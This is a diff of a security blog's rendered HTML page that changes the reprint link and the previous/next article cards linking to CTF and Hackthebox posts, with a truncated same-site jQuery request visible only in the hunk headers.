@@ -571,7 +471,7 @@ $.ajax(&#123;url:&quot;&#x2F;api&#x2F;amount.php&quot;,method:&quot;POST&quot;,d
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://wwwmarin.xyz/2025/07/30/xss/">https://wwwmarin.xyz/2025/07/30/xss/</a>
+                    <a href="https://wwwmarin.xyz/2025/08/01/ctfshow-jwt/">https://wwwmarin.xyz/2025/08/01/ctfshow-jwt/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -697,6 +597,58 @@ $.ajax(&#123;url:&quot;&#x2F;api&#x2F;amount.php&quot;,method:&quot;POST&quot;,d
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
+                <a href="/2025/08/27/hackthebox/">
+                    <div class="card-image">
+                        
+                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/fdd81ab4e06b3b576916484ce1da2b81.jpg" class="responsive-img" alt="Hackthebox">
+                        
+                        <span class="card-title">Hackthebox</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2025-08-27
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/WEB/" class="post-category">
+                                    WEB
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%88%B7%E9%A2%98/">
+                        <span class="chip bg-color">刷题</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
                 <a href="/2025/07/31/linux/">
                     <div class="card-image">
                         
@@ -712,9 +664,9 @@ $.ajax(&#123;url:&quot;&#x2F;api&#x2F;amount.php&quot;,method:&quot;POST&quot;,d
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2025-07-31
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2025-07-31
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -736,58 +688,6 @@ $.ajax(&#123;url:&quot;&#x2F;api&#x2F;amount.php&quot;,method:&quot;POST&quot;,d
                     
                     <a href="/tags/%E5%9F%BA%E7%A1%80/">
                         <span class="chip bg-color">基础</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2025/05/20/php-te-xing/">
-                    <div class="card-image">
-                        
-                        <img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/biasduuaasdbsa.jpg" class="responsive-img" alt="CTFSHOW-php特性">
-                        
-                        <span class="card-title">CTFSHOW-php特性</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2025-05-20
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/CTFSHOW/" class="post-category">
-                                    CTFSHOW
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/web/">
-                        <span class="chip bg-color">web</span>
-                    </a>
-                    
-                    <a href="/tags/%E5%88%B7%E9%A2%98/">
-                        <span class="chip bg-color">刷题</span>
                     </a>
                     
                 </div>
